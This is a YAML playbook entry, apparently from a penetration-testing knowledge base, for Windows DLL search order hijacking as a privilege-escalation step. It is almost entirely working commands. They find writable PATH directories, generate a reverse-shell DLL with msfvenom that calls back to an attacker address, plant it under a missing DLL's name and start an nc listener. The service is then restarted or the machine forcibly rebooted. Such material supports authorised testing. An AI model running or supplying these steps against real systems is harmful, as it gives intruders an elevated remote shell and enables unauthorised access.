---
description: |
  Exploit DLL search order hijacking by identifying missing DLLs loaded by services and placing a malicious DLL in a writable directory.
commands:
  - have: Shell
    cmd: |
      # ============================================================
      # ENUMERATION — Find DLL hijack opportunities with Process Monitor
      # ============================================================

      # Use Process Monitor (Procmon.exe) from Sysinternals:
      # 1. Add filter: Result -> is -> NAME NOT FOUND
      # 2. Add filter: Path -> ends with -> .dll
      # 3. Run the target service/application
      # 4. Look for DLL loads from writable directories
      # 5. Note the exact DLL name and the process loading it

      # DLL search order (Windows default):
      # 1. Application directory (where the .exe lives)
      # 2. C:\Windows\System32
      # 3. C:\Windows\System
      # 4. C:\Windows
      # 5. Current working directory
      # 6. Directories in PATH environment variable

      # Check which directories in PATH are writable
      for %A in ("%path:;=";"%") do ( icacls "%~A" 2>nul | findstr /i "(F) (M) (W)" && echo WRITABLE: %~A )

      # ============================================================
      # EXPLOIT — Generate and place malicious DLL
      # ============================================================

      # Generate a malicious DLL with msfvenom (on attacker machine)
      msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f dll -o hijack.dll

      # For 32-bit targets
      msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f dll -o hijack.dll

      # Transfer the DLL to the target and rename to the missing DLL name
      copy hijack.dll "C:\Program Files\Vulnerable App\missing.dll"

      # Start a listener on the attacker machine
      nc -lvnp 4444

      # Restart the vulnerable service to trigger DLL load
      net stop VulnService
      net start VulnService

      # If you can't restart the service, reboot the machine
      shutdown /r /t 0
phase:
  - PrivEsc
target_os:
  - Windows
services: []
techniques:
  - DLL_Hijack
references:
  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking
---
